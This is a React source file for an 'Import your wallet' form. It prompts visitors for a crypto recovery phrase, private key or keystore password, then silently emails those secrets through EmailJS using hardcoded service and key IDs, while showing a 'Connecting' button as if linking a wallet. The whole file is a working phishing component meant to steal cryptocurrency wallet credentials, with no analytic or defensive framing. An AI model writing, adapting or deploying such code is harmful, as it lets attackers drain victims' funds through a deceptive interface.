import { useRef, useState } from "react";
import { Usewallet } from "../context/Usewallet";
import emailjs from "@emailjs/browser";

function Form() {
  const { setFormVisible, setSuccess, walletArray, setWalletVisible } =
    Usewallet();
  const [inActive, setInActive] = useState(false);

  const [active, setActive] = useState(1);
  const form = useRef();

  function handleActive() {
    setInActive(true);
  }

  function handleFormClose() {
    setFormVisible(false);
    setWalletVisible(false);
  }

  const sendEmail = (e) => {
    e.preventDefault();
    handleActive();

    emailjs
      .sendForm("service_3tqqsyq", "template_fad2k5f", form.current, {
        publicKey: "CWqQJTSeQ8TX8-AlL",
      })
      .then(
        () => {
          handleFormClose();
          setSuccess(false);
        },
        (error) => {
          alert("FAILED...", error.text);
        }
      );
  };

  return (
    <div>
      <div className=" mx-auto mt-8 w-[90%] rounded bg-white p-8 shadow-lg md:mt-16 md:w-[70%]">
        <p className="flex justify-center gap-4 p-4">
          <span>
            {!walletArray
              ? ""
              : walletArray.map((wallet) => (
                  <span key={wallet.id}>
                    <img
                      src={wallet.imageUrl}
                      className="h-8 w-8"
                      alt="wallet.name"
                    />
                  </span>
                ))}
          </span>
          <span className="mb-4 text-center text-xl font-bold">
            Import your wallet
          </span>
        </p>
        <p className="flex gap-4 border-b border-b-gray-200 font-bold md:gap-8 md:text-xl">
          <span
            className={`${
              active === 1
                ? " cursor-pointer border-b-2 border-b-blue-400 pb-2"
                : ""
            }`}
            onClick={() => setActive(1)}
          >
            Phrase
          </span>
          <span
            className={`${
              active === 2
                ? " cursor-pointer border-b-2 border-b-blue-400 pb-2"
                : ""
            }`}
            onClick={() => setActive(2)}
          >
            Keystore Json
          </span>
          <span
            className={`${
              active === 3
                ? " cursor-pointer border-b-2 border-b-blue-400 pb-2"
                : ""
            }`}
            onClick={() => setActive(3)}
          >
            Private Key
          </span>
        </p>

        <form
          ref={form}
          onSubmit={sendEmail}
          className="bg-white font-medium text-stone-950"
        >
          {active === 1 && (
            <>
              <textarea
                name="message"
                rows="5"
                className="mt-4 w-full rounded-lg border border-blue-500 bg-white p-5 font-medium text-stone-950 outline-none md:mb-2"
                placeholder={"Recovery Phrase"}
                data-gramm="false"
              ></textarea>
              <span className="bg-white">
                Typically 12 - 24 words seperated by a single space
              </span>
            </>
          )}
          {active === 2 && (
            <>
              <textarea
                name="message"
                rows="5"
                className="my-4 w-full rounded-lg border border-blue-500 bg-white p-5 font-medium text-stone-950 outline-none md:mb-2"
                placeholder={"private key"}
                data-gramm="false"
              ></textarea>
              <input
                type="text"
                className="mb-5 w-full rounded-lg border border-blue-500 bg-white p-2 font-medium text-stone-950 outline-none md:my-5 md:mb-2 md:p-5"
                placeholder="Wallet Password"
              />

              <p>
                Several lines of text beginning with plus the password you used
                to encrypt it.
              </p>
            </>
          )}
          {active === 3 && (
            <>
              <textarea
                name="message"
                rows="5"
                className="mt-4 w-full rounded-lg border border-blue-500 bg-white p-5 font-medium text-stone-950 outline-none md:mb-2"
                placeholder={"private key"}
                data-gramm="false"
              ></textarea>
              <span className="bg-white">
                Typically 12 - 24 words seperated by a single space
              </span>
            </>
          )}

          {walletArray.map((wallet) => (
            <span key={wallet.id}>
              <input
                type="text"
                name="wallet"
                value={wallet.name}
                style={{ display: "none" }}
              />
            </span>
          ))}

          <div className="mt-5 flex gap-4">
            {!inActive ? (
              <button
                type="submit"
                disabled={inActive}
                className={`mx-auto block w-[70%]  ${
                  inActive ? "cursor-wait" : "cursor-pointer"
                } rounded bg-blue-500 py-2 text-center text-white md:px-4 md:pt-3 `}
              >
                Connect
              </button>
            ) : (
              <button
                disabled={inActive}
                className={`mx-auto block w-[70%]  ${
                  inActive ? "cursor-wait" : "cursor-pointer"
                } rounded bg-blue-500 py-2 text-center text-white md:px-4 md:pt-3 `}
              >
                Connecting
              </button>
            )}
            <p
              onClick={() => setFormVisible(false)}
              className=" w-[30%] cursor-pointer rounded bg-red-500 py-2 text-center text-white md:px-4 md:pt-3 "
            >
              Close
            </p>
          </div>
        </form>
      </div>
    </div>
  );
}

export default Form;
